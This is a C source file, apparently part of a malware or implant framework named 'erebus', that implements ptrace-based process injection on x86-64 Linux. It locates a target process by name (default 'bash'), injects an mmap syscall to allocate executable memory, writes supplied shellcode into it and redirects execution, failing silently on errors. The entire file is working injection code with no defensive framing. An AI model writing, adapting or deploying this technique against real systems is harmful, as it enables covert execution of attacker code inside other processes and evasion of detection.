#define _GNU_SOURCE
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include "../../include/injection.h"

#ifndef CONFIG_TARGET_PROCESS
#define CONFIG_TARGET_PROCESS "bash"
#endif

/* Walk /proc to find the first PID whose comm matches name (duplicated here
 * so each injection TU compiles independently without a shared helper). */
static pid_t _find_proc(const char *name)
{
    char path[64], comm[256];
    for (int pid = 2; pid < 65536; pid++) {
        snprintf(path, sizeof(path), "/proc/%d/comm", pid);
        FILE *f = fopen(path, "r");
        if (!f) continue;
        comm[0] = '\0';
        if (fgets(comm, sizeof(comm), f)) {
            size_t l = strlen(comm);
            if (l > 0 && comm[l - 1] == '\n') comm[l - 1] = '\0';
        }
        fclose(f);
        if (strcmp(comm, name) == 0)
            return (pid_t)pid;
    }
    return -1;
}

/*
 * Allocate executable memory inside the target process via an injected
 * mmap syscall, write shellcode with POKEDATA, then redirect RIP/PC.
 *
 * Approach:
 *   1. ATTACH to target.
 *   2. Back up registers.
 *   3. Overwrite next word of text with a syscall instruction.
 *   4. Set regs to call mmap(0, sc_len, PROT_RWX, MAP_ANON|MAP_PRIVATE, -1, 0).
 *   5. SINGLESTEP to execute; recover the mapped address from rax.
 *   6. Restore original text and registers.
 *   7. POKEDATA shellcode into the mmap'd region word by word.
 *   8. Redirect RIP to the mmap'd region and DETACH.
 */
void erebus_ptrace_inject(const unsigned char *sc, size_t sc_len)
{
#if !defined(__x86_64__)
    /* Only x86-64 implemented; on other arches fall back silently. */
    (void)sc; (void)sc_len;
    return;
#else
    pid_t pid = _find_proc(CONFIG_TARGET_PROCESS);
    if (pid < 0) return;

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) != 0) return;
    waitpid(pid, NULL, 0);

    /* Save original registers. */
    struct user_regs_struct orig_regs, regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &orig_regs) != 0)
        goto detach;
    regs = orig_regs;

    /* Save and replace one word of text at RIP with `syscall; nop`. */
    unsigned long rip = (unsigned long)orig_regs.rip;
    long orig_text    = ptrace(PTRACE_PEEKTEXT, pid, (void *)rip, NULL);
    /* syscall = 0x0F 0x05; fill rest with 0x90 (nop) */
    long syscall_word = (orig_text & ~0xFFFFL) | 0x050FL;
    ptrace(PTRACE_POKETEXT, pid, (void *)rip, (void *)syscall_word);

    /* Set up mmap syscall (number 9 on x86-64). */
    regs.rax = 9;                                /* SYS_mmap */
    regs.rdi = 0;                                /* addr = NULL */
    regs.rsi = sc_len;                           /* length */
    regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC; /* prot */
    regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;      /* flags */
    regs.r8  = (unsigned long long)-1;           /* fd */
    regs.r9  = 0;                                /* offset */
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
    waitpid(pid, NULL, 0);

    /* Recover mmap'd address from rax. */
    struct user_regs_struct after;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &after) != 0)
        goto restore_text;
    unsigned long long mapped = after.rax;
    if (mapped == (unsigned long long)-1 || mapped == 0)
        goto restore_text;

    /* Restore original text at RIP. */
    ptrace(PTRACE_POKETEXT, pid, (void *)rip, (void *)orig_text);

    /* Write shellcode word by word via POKEDATA. */
    size_t i = 0;
    for (; i + sizeof(long) <= sc_len; i += sizeof(long)) {
        long word;
        memcpy(&word, sc + i, sizeof(long));
        ptrace(PTRACE_POKEDATA, pid, (void *)(mapped + i), (void *)word);
    }
    if (i < sc_len) {
        long tail = 0;
        memcpy(&tail, sc + i, sc_len - i);
        ptrace(PTRACE_POKEDATA, pid, (void *)(mapped + i), (void *)tail);
    }

    /* Redirect execution and detach. */
    orig_regs.rip = mapped;
    ptrace(PTRACE_SETREGS, pid, NULL, &orig_regs);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return;

restore_text:
    ptrace(PTRACE_POKETEXT, pid, (void *)rip, (void *)orig_text);
detach:
    ptrace(PTRACE_SETREGS, pid, NULL, &orig_regs);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
#endif
}
